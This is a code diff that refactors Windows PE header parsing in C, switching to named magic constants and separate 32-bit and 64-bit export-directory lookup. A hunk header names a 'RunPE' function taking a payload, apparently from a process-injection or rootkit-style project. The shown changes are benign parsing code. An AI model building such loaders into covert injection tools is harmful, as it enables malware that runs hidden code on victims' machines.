@@ -684,10 +684,10 @@ BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
 	{
 		switch (ntHeaders->OptionalHeader.Magic)
 		{
-			case 0x10b:
+			case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
 				*is64Bit = FALSE;
 				return TRUE;
-			case 0x20b:
+			case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
 				*is64Bit = TRUE;
 				return TRUE;
 		}
@@ -786,10 +786,20 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName)
 {
 	BOOL is64Bit;
-	if (IsExecutable64Bit(image, &is64Bit) && BITNESS(is64Bit ? 64 : 32))
+	if (IsExecutable64Bit(image, &is64Bit))
 	{
-		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
-		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
+		PIMAGE_EXPORT_DIRECTORY exportDirectory;
+		if (is64Bit)
+		{
+			PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+			exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
+		}
+		else
+		{
+			PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+			exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
+		}
+
 		LPDWORD nameDirectory = (LPDWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNames));
 		LPWORD nameOrdinalDirectory = (LPWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNameOrdinals));
 
